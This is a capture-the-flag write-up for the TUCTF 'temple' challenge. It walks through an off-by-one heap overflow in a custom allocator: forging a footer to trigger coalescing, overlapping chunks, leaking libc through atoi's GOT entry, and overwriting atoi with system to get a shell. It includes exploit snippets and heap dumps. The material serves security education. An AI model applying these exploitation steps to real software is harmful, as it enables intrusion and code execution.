```
Points:   500
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Custom allocator & partial RELRO. Sounds like a heap exploitation & GOT overwrite business ;) To begin with, we were given a binary with a custom dynamic [memory allocator](https://github.com/xerof4ks/heapwn/blob/master/TUCTF/mm.c). Instead of analyzing its algorithm line by line (the memory allocator's implementation was given), I'll walk you through its key features via my exploit. To give you a brief idea, it's an overly simplified version of malloc. There are 0 (maybe I missed some while I'm writing this) security checks in terms of allocating/free-ing chunks. For the rest of the write-up I'll be refering to the provided allocator as "malloc". An allocated chunk has the following structure:

```
Both allocated and free blocks share the same header structure.           
HEADER: 8-byte, aligned to 8th byte of an 16-byte aligned heap, where     
          - The lowest order bit is 1 when the block is allocated, and      
            0 otherwise. <-- !!! Important !!!                              
          - The whole 8-byte value with the least significant bit set to 0  
            represents the size of the block as a size_t                    
            The size of a block includes the header and footer.             
FOOTER: 8-byte, aligned to 0th byte of an 16-byte aligned heap. It        
        contains the exact copy of the block's header.                
The minimum blocksize is 32 bytes. 
```

```c
typedef struct block
{
    /* Header contains size + allocation flag */
    word_t header;
    /*
     * We don't know how big the payload will be.  Declaring it as an
     * array of size 0 allows computing its starting address using
     * pointer notation.
     */
    char payload[0];
    /*
     * We can't declare the footer as part of the struct, since its starting
     * position is unknown
     */
} block_t;
```

### _Exploit & Allocator Analysis_


```python
alloc(0x50,  'A'*8)
alloc(0x30,  'B'*8) 
alloc(0x70,  'C'*8) 
alloc(0x70,  'D'*8) 
```

```
0x625180:	0x0000000000000031	0x0000000000000031 <-- chunk 8
0x625190:	0x0000000000000051	0x00000000006251c0 <-- dataptr 8
0x6251a0:	0x0000000000000008	0x0000000000401d61
0x6251b0:	0x0000000000000031	0x0000000000000061
0x6251c0:	0x4141414141414141	0x000000000000000a
0x6251d0:	0x0000000000000000	0x0000000000000000
0x6251e0:	0x0000000000000000	0x0000000000000000
0x6251f0:	0x0000000000000000	0x0000000000000000
0x625200:	0x0000000000000000	0x0000000000000000
0x625210:	0x0000000000000061	0x0000000000000031 <-- chunk 9
0x625220:	0x0000000000000031	0x0000000000625250 <-- dataptr 9
0x625230:	0x0000000000000008	0x0000000000401d61
0x625240:	0x0000000000000031	0x0000000000000041
0x625250:	0x4242424242424242	0x000000000000000a
0x625260:	0x0000000000000000	0x0000000000000000
0x625270:	0x0000000000000000	0x0000000000000000
0x625280:	0x0000000000000041	0x0000000000000031 <-- chunk 10
0x625290:	0x0000000000000071	0x00000000006252c0 <-- dataptr 10
0x6252a0:	0x0000000000000008	0x0000000000401d61
0x6252b0:	0x0000000000000031	0x0000000000000081
0x6252c0:	0x4343434343434343	0x000000000000000a
0x6252d0:	0x0000000000000000	0x0000000000000000
0x6252e0:	0x0000000000000000	0x0000000000000000
0x6252f0:	0x0000000000000000	0x0000000000000000
0x625300:	0x0000000000000000	0x0000000000000000
0x625310:	0x0000000000000000	0x0000000000000000
0x625320:	0x0000000000000000	0x0000000000000000
0x625330:	0x0000000000000081	0x0000000000000031 <-- chunk 11
0x625340:	0x0000000000000071	0x0000000000625370 <-- dataptr 11
0x625350:	0x0000000000000008	0x0000000000401d61
0x625360:	0x0000000000000031	0x0000000000000081
0x625370:	0x4444444444444444	0x000000000000000a
0x625380:	0x0000000000000000	0x0000000000000000
0x625390:	0x0000000000000000	0x0000000000000000
0x6253a0:	0x0000000000000000	0x0000000000000000
0x6253b0:	0x0000000000000000	0x0000000000000000
0x6253c0:	0x0000000000000000	0x0000000000000000
0x6253d0:	0x0000000000000000	0x0000000000000000
0x6253e0:	0x0000000000000081	0x0000000000000c20 <-- top chunk
```

The context in which we are dabbling on is a wisdom maker. We get to allocate, edit and delete wisdoms. Free-ing involves printing the selected wisdom's data as well. Those wisdoms are nothing more than dynamically allocated C structs. Here is its pseudo version once they are originally allocated:

```c
struct wisdom {
	size;       /* amount of bytes that were allocated for the data pointer */
	dataptr;    /* malloc'd data pointer which points to whatever string we entered */
	0x8;        /* length of the hardcoded string */
	0x401d61;   /* hardcoded pointer to "Neonate\n" */
};
```

```      
0x625180:   0x0000000000000031   0x0000000000000031 <-- chunk 8
           +------------------+ +-------------------+   <----+
           |   [read_bytes]   | |     [dataptr]     |        |
0x625190:  |0x0000000000000051|	| 0x00000000006251c0|        |
           +------------------+ +-------------------+        |  alloc'd wisdom
           +------------------+ +-------------------+        |
           |                    |    [Neonate\n]    |        |
0x6251a0:  |0x0000000000000008|	| 0x0000000000401d61|        |
           +------------------+ +-------------------+   <----+ 
```

`readbytes` is the function responsible for reading our data in both allocation and edit. There's a particular feature in it which makes it quite juicy.

```asm
<edit>
mov     rax, qword [rbp-0x8 {chunk}]
mov     rax, qword [rax]
mov     edx, eax
mov     rax, qword [rbp-0x8 {chunk}]
mov     rax, qword [rax+0x8]
mov     esi, edx
mov     rdi, rax
call    readbytes
```

```asm
<readbytes>
push    rbp
mov     rbp, rsp
sub     rsp, 0x10 {var_18}
mov     qword [rbp-0x8 {ptr}], rdi
mov     dword [rbp-0xc {size}], esi
mov     rdx, qword [rel stdin]
mov     eax, dword [rbp-0xc]
add     eax, 0x1 <-- !!!
mov     ecx, eax
mov     rax, qword [rbp-0x8]
mov     esi, ecx
mov     rdi, rax
call    fgets
```

We have the following line in the exploit:

```python
edit(9, 'A'*(0x30) + p8(0xd0))
```

According to `readbytes`, it will read in `size + 0x1` bytes and store it in the data pointer. Meaning 0x32, where the 0x32th byte will be the null byte (that's how `fgets` works). Chunk 9's data pointer is `0x625250`. `0x625250 + 0x32 == 0x625282`. That means we get to overwrite the `footer` field of chunk 9 whose usage is crucial for the `coalesce` function which we will inspect soon.


```
0x625180:	0x0000000000000031	0x0000000000000031 <-- chunk 8
0x625190:	0x0000000000000051	0x00000000006251c0
0x6251a0:	0x0000000000000008	0x0000000000401d61
0x6251b0:	0x0000000000000031	0x0000000000000061 [supposedly free] <------+
0x6251c0:	0x4141414141414141	0x000000000000000a		            |
0x6251d0:	0x0000000000000000	0x0000000000000000		            |
0x6251e0:	0x0000000000000000	0x0000000000000000		            |	
0x6251f0:	0x0000000000000000	0x0000000000000000			    |
0x625200:	0x0000000000000000	0x0000000000000000			    |
0x625210:	0x0000000000000061	0x0000000000000031 <-- chunk 9              |  
0x625220:	0x0000000000000031	0x0000000000625250 <-- dataptr 9            |
0x625230:	0x0000000000000008	0x0000000000401d61			    |
0x625240:	0x0000000000000031	0x0000000000000041			    |					
0x625250:	0x4141414141414141	0x4141414141414141       ...        	    |					
0x625260:	0x4141414141414141	0x4141414141414141  1-byte overflow         |					
0x625270:	0x4141414141414141	0x4141414141414141       ...		    |					
0x625280:	0x00000000000000d0	0x0000000000000031 <-- chunk 10 [footer/overwritten prev_size field]
0x625290:	0x0000000000000071	0x00000000006252c0
```

I know the above image might look a bit daunting but stay with me. What we practically accomplished is to fool chunk 10 into thinking that its previous chunk is free! "How and why" you may ask. Free works in the following manner:

```c
void free(void *bp)
{
    if (bp == NULL)
    {
        return;
    }

    block_t *block = payload_to_header(bp);
    size_t size = get_size(block);

    write_header(block, size, false);
    write_footer(block, size, false);

    coalesce(block);

}
```

Firstly, it updates the `header` and `footer` fields by turning off the last significant bit. That action signifies to the rest of the chunks that it's currently free (chunk 9, that is). Secondly and lastly, it will unlink/coalesce the chunk which just got free'd with its previous/next chunk IF and ONLY IF they are free'd as well. Coalesce's code incoming:

```c
/* Coalesce: Coalesces current block with previous and next blocks if either
 *           or both are unallocated; otherwise the block is not modified.
 *           Returns pointer to the coalesced block. After coalescing, the
 *           immediate contiguous previous and next blocks must be allocated.
 */
static block_t *coalesce(block_t * block) 
{
				...

    if (prev_alloc && next_alloc)              
    {
        return block;
    }

    else if (prev_alloc && !next_alloc)      
    {
        size += get_size(block_next);
        write_header(block, size, false);
        write_footer(block, size, false);
    }

    else if (!prev_alloc && next_alloc)       
    {
        size += get_size(block_prev);
        write_header(block_prev, size, false);
        write_footer(block_prev, size, false);
        block = block_prev;
    }

    else                                      
    {
        size += get_size(block_next) + get_size(block_prev);
        write_header(block_prev, size, false);
        write_footer(block_prev, size, false);

        block = block_prev;
    }
    return block;
}
```

Let me give you a brief pseudocode intro on `coalesce`.

* Calculate the pointers to the previous and next chunk of the chunk which just got free'd.

* Check if they are in use or not.

* Calculate the size of the currect block.

* If none of the chunks (that is, the previous / next chunk) are free'd, just return.

* If **only** the previous chunk is free, consolidate backwards and update the `header` and `footer` fields accordingly.

* If **only** the next chunk is free, consolidate forward and update the `header` and `footer` fields accordingly.

* If **both** previous and next chunk are free'd, consolidate all 3 (including the current chunk) and update the `header` and `footer` fields accordingly.

If you actually think about it, the **next chunk** will always be free'd (unless tampering has taken place) because the `delete` function free's the data pointer first and the chunk itself afterwards. That being said, we will either fall under the 2nd or 4th case. I purposely picked the 4th one and you'll see why. After all this analysis, let's see the magic happening.

```python
free(10)
```

```
            [chunk 9's footer]                    
0x625280:	0x00000000000000d0	0x0000000000000031 
0x625290:	0x0000000000000071	0x00000000006252c0 - + dataptr 10
0x6252a0:	0x0000000000000008	0x0000000000401d61   |
				             [header]        |
0x6252b0:	0x0000000000000031	0x0000000000000080 <-- header: 0x81 => 0x80 
0x6252c0:       0x4343434343434343	0x000000000000000a
0x6252d0:	0x0000000000000000	0x0000000000000000
		                    ...					
				             [footer] ---> 0x81 => 0x80
0x625330:	0x0000000000000080	0x0000000000000031
```

The first part of `delete` as I mentioned before free's the data pointer first. As you can see from the above image, malloc did indeed free chunk 10's data pointer by calling `write_header` & `write_footer` which turned off the lsb of `header` and `footer` respectively to indicate that it's currently free. Next it's chunk 10's turn. Instead of showing it in one-go I'll illustrate the coalescing step-by-step.

```python
free(10)
```

The state of the heap is the following right before chunk 10's turn:

```
0x6251b0:	0x0000000000000031	0x0000000000000061
0x6251c0:	0x4141414141414141	0x000000000000000a
0x6251d0:	0x0000000000000000	0x0000000000000000
0x6251e0:	0x0000000000000000	0x0000000000000000
0x6251f0:	0x0000000000000000	0x0000000000000000
0x625200:	0x0000000000000000	0x0000000000000000
0x625210:	0x0000000000000061	0x0000000000000031
0x625220:	0x0000000000000031	0x0000000000625250
0x625230:	0x0000000000000008	0x0000000000401d61
0x625240:	0x0000000000000031	0x0000000000000041
0x625250:	0x4141414141414141	0x4141414141414141
0x625260:	0x4141414141414141	0x4141414141414141
0x625270:	0x4141414141414141	0x4141414141414141
0x625280:	0x00000000000000d0	0x0000000000000031 <-- chunk 10
0x625290:	0x0000000000000071	0x00000000006252c0
0x6252a0:	0x0000000000000008	0x0000000000401d61
0x6252b0:	0x0000000000000031	0x0000000000000080 <-- chunk 10's dataptr is free'd
```

The first part of free will call `write_header` and `write_footer` to let the rest of the chunks know that chunk 10 free.

```
0x625180:	0x0000000000000031	0x0000000000000031 <-- chunk 8
0x625190:	0x0000000000000051	0x00000000006251c0
0x6251a0:	0x0000000000000008	0x0000000000401d61
0x6251b0:	0x0000000000000031	0x0000000000000061 [supposedly free] <------+
0x6251c0:	0x4141414141414141	0x000000000000000a		            |
0x6251d0:	0x0000000000000000	0x0000000000000000		            |
0x6251e0:	0x0000000000000000	0x0000000000000000		            |	
0x6251f0:	0x0000000000000000	0x0000000000000000			    |
0x625200:	0x0000000000000000	0x0000000000000000			    |
0x625210:	0x0000000000000061	0x0000000000000031 <-- chunk 9              |  
0x625220:	0x0000000000000031	0x0000000000625250 <-- dataptr 9            |
0x625230:	0x0000000000000008	0x0000000000401d61			    |
0x625240:	0x0000000000000031	0x0000000000000041			    |					
0x625250:	0x4141414141414141	0x4141414141414141       ...        	    |					
0x625260:	0x4141414141414141	0x4141414141414141  1-byte overflow         |					
0x625270:	0x4141414141414141	0x4141414141414141       ...		    |					
0x625280:	0x00000000000000d0	0x0000000000000030 <-- chunk 10 [footer/overwritten prev_size field]
0x625290:	0x0000000000000071	0x00000000006252c0
```

Then, `coalesce` will follow up. Knowing that we want to intentionally fall under the 4th case, this is the code we're interested in:

```c
block_t *block_next = find_next(block);
block_t *block_prev = find_prev(block);
			...
size_t size = get_size(block);
			...      
size += get_size(block_next) + get_size(block_prev);
write_header(block_prev, size, false);
write_footer(block_prev, size, false);
block = block_prev;
```

```
block_next == 0x625280 + 0x30 == 0x6252b0
block_prev == 0x625280 - 0xd0 == 0x6251b0
size       == 0x30 + 0x30 + 0x60 == 0x110
block      == 0x6251b0
```

We can safely conclude that the final coalesced chunk will be at address `0x6251b0` with `header` and `footer` of size `0x110`.

```
0x625180:	0x0000000000000031	0x0000000000000031
0x625190:	0x0000000000000051	0x00000000006251c0
0x6251a0:	0x0000000000000008	0x0000000000401d61
0x6251b0:	0x0000000000000031	0x0000000000000110 <-- coalesced chunk
0x6251c0:	0x4141414141414141	0x000000000000000a
0x6251d0:	0x0000000000000000	0x0000000000000000
0x6251e0:	0x0000000000000000	0x0000000000000000
0x6251f0:	0x0000000000000000	0x0000000000000000
0x625200:	0x0000000000000000	0x0000000000000000
0x625210:	0x0000000000000061	0x0000000000000031 <-- chunk 9 [still in use]
0x625220:	0x0000000000000031	0x0000000000625250 <-- dataptr 9
0x625230:	0x0000000000000008	0x0000000000401d61
0x625240:	0x0000000000000031	0x0000000000000041
0x625250:	0x4141414141414141	0x4141414141414141
0x625260:	0x4141414141414141	0x4141414141414141
0x625270:	0x4141414141414141	0x4141414141414141
0x625280:	0x00000000000000d0	0x0000000000000030
0x625290:	0x0000000000000071	0x00000000006252c0
0x6252a0:	0x0000000000000008	0x0000000000401d61
0x6252b0:	0x0000000000000030	0x0000000000000080
0x6252c0:	0x0000000000000110	0x000000000000000a
```

Look at that! The coalesced chunk got moved *before* chunk 9, which is currently in use. Why was that so easy you may ask. It's based on a flaw/feature in the allocator's implementation.

`coalesce` checks if the previous chunk is free by calling `extract_alloc`. Its corresponding code is this:

```c
/*
 * extract_alloc: returns the allocation status of a given header value based
 *                on the header specification above.
 */
static bool extract_alloc(word_t word)
{
    return (bool)(word & alloc_mask);
}
```

Which depends on the return value of `find_prev_footer`, which returns the address of the *footer of the previous chunk* (meaning `0x625280`, meaning data pointer 9's `footer` field in our case):

```c
/*
 * find_prev_footer: returns the footer of the previous block.
 */
static word_t *find_prev_footer(block_t *block)
{
    // Compute previous footer position as one word before the header
    return (&(block->header)) - 1;
}
```

Once `find_prev_footer` is done, `extract_alloc` will check if its previous chunk is free by AND-ing the lsb of the footer's value (`0xd0` in our case) with `alloc_mask`.

```c
static const word_t alloc_mask = 0x1;
```

That is a major implementation win (and lack of security checks) for us. If it were to check the *header* of data pointer 9, it'd find out that it's actually in use! It's time to overlap chunk 9 with a newly allocated chunk so that we can overwrite chunk 9's data pointer with a GOT entry in order to leak libc.

### _Libc Leak_

In order to get our beloved libc's base address, all we have to do is request a chunk of size less than 0x110. The reason for that is described in the allocator's documentation.

```
Upon memory request of size S, a block of size S + dsize, rounded up to   
16 bytes, is allocated on the heap, where dsize is 2*8 = 16.              
Selecting the block for allocation is performed by finding the first      
block that can fit the content based on a first-fit or next-fit search    
policy.                                                                   
The search starts from the beginning of the heap pointed by heap_listp.   
It sequentially goes through each block in the implicit free list,        
the end of the heap, until either                                         
   - A sufficiently-large unallocated block is found, or                     
   - The end of the implicit free list is reached, which occurs              
     when no sufficiently-large unallocated block is available.              
In case that a sufficiently-large unallocated block is found, then        
that block will be used for allocation. Otherwise--that is, when no       
sufficiently-large unallocated block is found--then more unallocated      
memory of size chunksize or requested size, whichever is larger, is       
requested through sbrk, and the search is redone.                         
 ```

The keyword phrase is this:

```
The search starts from the beginning of the heap pointed by heap_listp
```

That straight up tells us that the entire heap state is basically stored as a linked-list. That is, there is a global pointer variable named `heap_listp` which points to the first allocated chunk. The first/next-fit search algo is the following:

```c
/*
 * find_fit: Looks for a free block with at least asize bytes with
 *           first-fit policy. Returns NULL if none is found.
 */
static block_t *find_fit(size_t asize)
{
    block_t *block;

    for (block = heap_listp; get_size(block) > 0;
                             block = find_next(block))
    {

        if (!(get_alloc(block)) && (asize <= get_size(block)))
        {
            return block;
        }
    }
    return NULL; // no fit found
}
```

Practically, it loops though the linked-list until it finds a free chunk with a big enough size. It accomplishes that by extracting the size of the currently checked chunk and it adds that to its address in order to check the next one and so on. No chunk is free up until the coalesced chunk, which gives us the opportunity to take advantage of the first-fit algo and allocate a new chunk at `0x6251c0`.

```python
alloc(0xa0,  'F'*0x20 + p64(0x61) + p64(0x31) * 2 + p64(atoi_got) + p64(8) + p64(atoi_got))
```

```
0x625180:	0x0000000000000031	0x0000000000000031 <-- chunk 8
0x625190:	0x0000000000000051	0x00000000006251c0 <-- dataptr 8
0x6251a0:	0x0000000000000008	0x0000000000401d61
0x6251b0:	0x0000000000000031	0x0000000000000031 <-- new chunk
0x6251c0:	0x00000000000000a1	0x00000000006251f0 <-- new chunk dataptr
0x6251d0:	0x0000000000000008	0x0000000000401d61
0x6251e0:	0x0000000000000031	0x00000000000000b1
0x6251f0:	0x4646464646464646	0x4646464646464646
0x625200:	0x4646464646464646	0x4646464646464646
0x625210:	0x0000000000000061	0x0000000000000031 <-- chunk 9
0x625220:	0x0000000000000031	0x0000000000603098 <-- dataptr 9 => atoi's GOT
0x625230:	0x0000000000000008	0x0000000000603098
```

Ayyy! Chunk 9's data pointer was successfully overwritten with atoi's GOT entry. Now we can free chunk 9 which in return will print its data pointer. Notice how I overwrote the hardcoded string's address with atoi's GOT entry as well. That's because `delete` works in the following way:

```asm
						mov     qword [rbp-0x18], rdi
						mov     rax, qword [rbp-0x18]
						mov     rax, qword [rax+0x18]
						mov     esi, 0x401d61  {"Neonate\n"}
						mov     rdi, rax
						call    strcmp
						test    eax, eax
			          t - - - - -	jne     0x401593 - - - - - f
			          |					   |
	      mov     rax, qword [rbp-0x18]			mov     rax, qword [rbp-0x18]
	      mov     rax, qword [rax+0x8]			mov     rax, qword [rbp-0x18]
	      mov     rdi, rax				        mov     rdi, rax
	      call    mm_free					call    mm_free
```

If the hardcoded string isn't the hardcoded string afterall, it will just free the chunk itself and not the data pointer. That is a bypass we want to achieve otherwise it would free the GOT entry as well which would lead to a segfault (feel free to do the maths by yourself).

```
0x625210:	0x0000000000000061	0x0000000000000030 <-- chunk 9
0x625220:	0x0000000000000031	0x0000000000603098 <-- dataptr 9
0x625230:	0x0000000000000008	0x0000000000603098
0x625240:	0x0000000000000030	0x0000000000000041
```

As you can see chunk 9's `header` and `footer` fields got updated. We're good to go.

### _Pwning Time_

The heap state is a big mess at the moment but we can get RIP control if we just look at it careful enough.

```
0x625180:	0x0000000000000031	0x0000000000000031 <-- chunk 8
0x625190:	0x0000000000000051	0x00000000006251c0 <-- dataptr 8
0x6251a0:	0x0000000000000008	0x0000000000401d61
0x6251b0:	0x0000000000000031	0x0000000000000031 <-- new chunk
0x6251c0:	0x00000000000000a1	0x00000000006251f0 <-- new chunk dataptr
0x6251d0:	0x0000000000000008	0x0000000000401d61
0x6251e0:	0x0000000000000031	0x00000000000000b1
0x6251f0:	0x4646464646464646	0x4646464646464646
0x625200:	0x4646464646464646	0x4646464646464646
0x625210:	0x0000000000000061	0x0000000000000030 <-- chunk 9 [free]
0x625220:	0x0000000000000031	0x0000000000603098
0x625230:	0x0000000000000008	0x0000000000603098
0x625240:	0x0000000000000030	0x0000000000000041
```

What if we edit chunk 8's data pointer? It points to `0x6251c0` which is the new chunk's data! That way we can overwrite new chunk's data pointer with atoi's GOT entry and then call `edit` on the new chunk to overwrite `atoi` with `system`! Game over!

```python
# overwrite heap pointer with atoi's GOT entry
edit(8, p64(9) + p64(atoi_got))
```

```
0x625180:	0x0000000000000031	0x0000000000000031 <-- chunk 8
0x625190:	0x0000000000000051	0x00000000006251c0 <-- dataptr 8
0x6251a0:	0x0000000000000008	0x0000000000401d61
0x6251b0:	0x0000000000000031	0x0000000000000031 <-- new chunk 
0x6251c0:	0x0000000000000009	0x0000000000603098 <-- new chunk dataptr => atoi GOT
0x6251d0:	0x000000000000000a	0x0000000000401d61
```

```python
edit(12, p64(system))
```

```
gdb-peda$ x 0x0000000000603098
0x603098:	0x00007ffff7a52390
gdb-peda$ x 0x00007ffff7a52390
0x7ffff7a52390 <__libc_system>:	0xfa86e90b74ff8548
```

Voila! Next time we're prompted with the menu option, we can enter `sh` which will go through what is supposed to be `atoi` but it's `system` instead and we'll get a gorgeous shell!

```
[+] atoi:   0x7ffff7a43e80
[+] Libc:   0x7ffff7a0d000
[+] system: 0x7ffff7a43e80
[*] Switching to interactive mode
$ pwd
/home/admin/chal
$ ls
flag.txt
start.sh
temple
temple.txt
$ cat flag.txt
TUCTF{0n3_Byt3_0v3rwr1t3_Ac0lyt3}
```


